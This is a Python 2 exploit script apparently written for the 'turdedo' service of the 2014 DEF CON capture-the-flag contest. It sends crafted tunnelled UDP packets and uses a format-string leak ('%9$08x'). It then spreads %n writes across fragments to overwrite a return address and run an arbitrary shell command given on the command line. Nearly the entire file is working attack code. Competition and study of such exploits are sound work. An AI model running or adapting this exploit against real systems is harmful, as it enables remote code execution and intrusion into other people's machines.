#!/usr/bin/env python

import socket
import struct
import sys
import binascii
import telnetlib

#ADDR = "localhost"
#ADDR = "turdedo_5f55104b1d60779dbe8dcf5df2b186ad.2014.shallweplayaga.me"

ADDR = sys.argv[1]
PORT = 3544

# return a UDP socket and the ai_addr
def get_sock_aiddr():
    ##########################
    # setup addrinfo and stuff
    try:
        ai_family, ai_socktype, ai_protocol, ai_canonname, ai_addr = socket.getaddrinfo(ADDR, PORT, socket.AF_INET, socket.SOCK_DGRAM)[0]
    except socket.gaierror, msg:
        print msg
        exit(1)

    ##############
    # get a socket
    try:
        sockfd = socket.socket(ai_family, ai_socktype)
    except socket.error, msg:
        print msg
        exit(1)

    #############
    # now connect
    try:
        sockfd.connect(ai_addr)
    except socket.error, msg:
        print msg
        exit(1)

    return sockfd, ai_addr



# leak the pointer to the return address of snprintf()
# we will overwrite the value at this pointer with our format string
def leak_snp_retptr():
    global PORT

    sockfd, ai_addr = get_sock_aiddr()
    ipaddr = socket.inet_aton(ai_addr[0])
    nipaddr = struct.unpack("cccc", ipaddr)
    nipaddr =   chr(~ord(nipaddr[0]) & 0xff) + \
                chr(~ord(nipaddr[1]) & 0xff) + \
                chr(~ord(nipaddr[2]) & 0xff) + \
                chr(~ord(nipaddr[3]) & 0xff)

    rdata = "SYN" 

    data = "AA" 
    data += struct.pack(">H", PORT) 
    data += struct.pack(">H", len(rdata) + 8)
    data += "DD" 
    data += rdata
    data2 = "A" * 48
    hdr = "AAAA"
    hdr += struct.pack(">H", len(data) + 8)                                         # data len
    hdr += chr(44)                                                                  # protocol
    hdr = hdr.ljust(24, "\x20")
    hdr += "\x20\x01\x00\x00"
    hdr += ipaddr                                                                   # ip
    hdr += "\x00\x00\xf2\x27"
    hdr += nipaddr                                                                  # ~ip
    hdr += chr(17)
    hdr = hdr.ljust(42, "\x20")
    hdr += struct.pack(">H", 0x0)
    hdr += struct.pack(">H", len(data2) + 8)
    hdr = hdr.ljust(48, "\x20")

    buf = hdr + data

    sockfd.sendall(buf)

    synack = sockfd.recv(1024)
    synack = synack.split("SYNACK")
    intval = synack[-1]

    rdata = "ACK" + intval 
    data = "AA" 
    data += struct.pack(">H", PORT) 
    data += struct.pack(">H", len(rdata) + 8)
    data += "DD" 
    data += rdata
    data2 = "A" * 48
    hdr = "AAAA"
    hdr += struct.pack(">H", len(data) + 8)                                         # data len
    hdr += chr(44)                                                                  # protocol
    hdr = hdr.ljust(24, "\x20")
    hdr += "\x20\x01\x00\x00"
    hdr += ipaddr                                                                   # ip
    hdr += "\x00\x00\xf2\x27"
    hdr += nipaddr                                                                  # ~ip
    hdr += chr(17)
    hdr = hdr.ljust(42, "\x20")
    hdr += struct.pack(">H", 0x0)
    hdr += struct.pack(">H", len(data2) + 8)
    hdr = hdr.ljust(48, "\x20")

    buf = hdr + data

    sockfd.sendall(buf)

    print sockfd.recv(1024)

    rdata = "echo %9$08x"
    data = "AA" 
    data += struct.pack(">H", PORT) 
    data += struct.pack(">H", len(rdata) + 8)
    data += "DD" 
    data += rdata
    data2 = "A" * 48
    hdr = "AAAA"
    hdr += struct.pack(">H", len(data) + 8)                                         # data len
    hdr += chr(44)                                                                  # protocol
    hdr = hdr.ljust(24, "\x20")
    hdr += "\x20\x01\x00\x00"
    hdr += ipaddr                                                                   # ip
    hdr += "\x00\x00\xf2\x27"
    hdr += nipaddr                                                                  # ~ip
    hdr += chr(17)
    hdr = hdr.ljust(42, "\x20")
    hdr += struct.pack(">H", 0x0)
    hdr += struct.pack(">H", len(data2) + 8)
    hdr = hdr.ljust(48, "\x20")

    buf = hdr + data

    sockfd.sendall(buf)

    b = sockfd.recv(1024)
    f = b[56:]
    if '\0' in f:
        f = f[:f.index('\0')]

    return int(f, 16) - 60

    sockfd.close()


# send a UDP fragment with the "n"
def send_n_frag(s, owrite_off, tot_size, ipaddr, nipaddr):
    global PORT

    udphdr = "nA"                                                                    # fragment_identifier 
    udphdr += struct.pack(">H", PORT) 
    udphdr += struct.pack(">H", 16 + (tot_size - 12))
    udphdr += "DD" 

    hdr = "AAAA"
    hdr += struct.pack(">H", len(udphdr) + 8)                                         # data len
    hdr += chr(44)                                                                  # protocol
    hdr = hdr.ljust(24, "\x20")
    hdr += "\x20\x01\x00\x00"
    hdr += ipaddr                                                                   # ip
    hdr += "\x00\x00\xf2\x27"
    hdr += nipaddr                                                                  # ~ip
    hdr += chr(17)
    hdr = hdr.ljust(42, "\x20")
    hdr += struct.pack(">H", owrite_off)
    hdr += struct.pack(">H", 48 + 8)
    hdr = hdr.ljust(48, "\x20")

    buf = hdr + udphdr

    s.sendall(buf)

# do it all
def do_it(fmt1, fmt2, fmt3, fmt4, cmd):
    global PORT

    reta_ptr = leak_snp_retptr()
    sockfd, ai_addr = get_sock_aiddr()

    # Total packet size
    PACKET_TOT_SIZE = 800

    # offsets where the "n"'s will be written
    OWRITE_LOC_1 = 0x21
    OWRITE_LOC_2 = 0x61
    OWRITE_LOC_3 = 0xa1
    OWRITE_LOC_4 = 0xe0

    ipaddr = socket.inet_aton(ai_addr[0])
    nipaddr = struct.unpack("cccc", ipaddr)
    nipaddr =   chr(~ord(nipaddr[0]) & 0xff) + \
                chr(~ord(nipaddr[1]) & 0xff) + \
                chr(~ord(nipaddr[2]) & 0xff) + \
                chr(~ord(nipaddr[3]) & 0xff)

    """
    SYN
    """
    udpdata = "SYN" 
    udphdr = "nA" 
    udphdr += struct.pack(">H", PORT) 
    udphdr += struct.pack(">H", len(udpdata) + 8)
    udphdr += "DD" 
    udphdr += udpdata
    hdr = "AAAA"
    hdr += struct.pack(">H", len(udphdr) + 8)                                         # data len
    hdr += chr(44)                                                                  # protocol
    hdr = hdr.ljust(24, "\x20")
    hdr += "\x20\x01\x00\x00"
    hdr += ipaddr                                                                   # ip
    hdr += "\x00\x00\xf2\x27"
    hdr += nipaddr                                                                  # ~ip
    hdr += chr(17)
    hdr = hdr.ljust(42, "\x20")
    hdr += struct.pack(">H", 0x0)
    hdr += struct.pack(">H", 48 + 8)
    hdr = hdr.ljust(48, "\x20")

    buf = hdr + udphdr

    sockfd.sendall(buf)

    synack = sockfd.recv(1024)
    synack = synack.split("SYNACK")
    intval = synack[-1]

    """
    ACK
    """
    udpdata = "ACK" + intval 
    udphdr = "nA" 
    udphdr += struct.pack(">H", PORT) 
    udphdr += struct.pack(">H", len(udpdata) + 8)
    udphdr += "DD" 
    udphdr += udpdata
    hdr = "AAAA"
    hdr += struct.pack(">H", len(udphdr) + 8)                                         # data len
    hdr += chr(44)                                                                  # protocol
    hdr = hdr.ljust(24, "\x20")
    hdr += "\x20\x01\x00\x00"
    hdr += ipaddr                                                                   # ip
    hdr += "\x00\x00\xf2\x27"
    hdr += nipaddr                                                                  # ~ip
    hdr += chr(17)
    hdr = hdr.ljust(42, "\x20")
    hdr += struct.pack(">H", 0x0)
    hdr += struct.pack(">H", 48 + 8)
    hdr = hdr.ljust(48, "\x20")

    buf = hdr + udphdr

    sockfd.sendall(buf)

    print sockfd.recv(1024)

    """
    Send the first fragment containing:
    - our format strings
    - the command to inject
    """
    udpdata = ("echo " + fmt1).ljust(0x40, "\x20")
    udpdata += fmt2.ljust(0x40, "\x20")
    udpdata += fmt3.ljust(0x40, "\x20")
    udpdata += fmt4.ljust(0x40, "\x20")
    udpdata += "\x20" * 176
   
    # the 4 addresses to put on the stack
    udpdata += struct.pack("<I", reta_ptr)
    udpdata += struct.pack("<I", reta_ptr + 1)
    udpdata += struct.pack("<I", reta_ptr + 2)
    udpdata += struct.pack("<I", reta_ptr + 3)

    # The command to run
    udpdata += (("`%s`")%cmd).ljust(352, "\x20")

    udphdr = "nA" 
    udphdr += struct.pack(">H", PORT) 
    udphdr += struct.pack(">H", len(udpdata) + 8)
    udphdr += "DD" 
    udphdr += udpdata
    hdr = "AAAA"
    hdr += struct.pack(">H", len(udphdr) + 8)                                         # data len
    hdr += chr(44)                                                                  # protocol
    hdr = hdr.ljust(24, "\x20")
    hdr += "\x20\x01\x00\x00"
    hdr += ipaddr                                                                   # ip
    hdr += "\x00\x00\xf2\x27"
    hdr += nipaddr                                                                  # ~ip
    hdr += chr(17)
    hdr = hdr.ljust(42, "\x20")
    hdr += struct.pack(">H", 0x1)
    hdr += struct.pack(">H", 48 + 8)
    hdr = hdr.ljust(48, "\x20")

    buf = hdr + udphdr

    sockfd.sendall(buf)

    """
    Send the fragments' headers containing the "n" for the %n
    """
    send_n_frag(sockfd, OWRITE_LOC_1, PACKET_TOT_SIZE, ipaddr, nipaddr)
    send_n_frag(sockfd, OWRITE_LOC_2, PACKET_TOT_SIZE, ipaddr, nipaddr)
    send_n_frag(sockfd, OWRITE_LOC_3, PACKET_TOT_SIZE, ipaddr, nipaddr)
    send_n_frag(sockfd, OWRITE_LOC_4, PACKET_TOT_SIZE, ipaddr, nipaddr)

    print sockfd.recv(40000)

    sockfd.close()

do_it("%139x%122$", "%249x%123$", "%50x%124$", "%221x%125$", sys.argv[2])
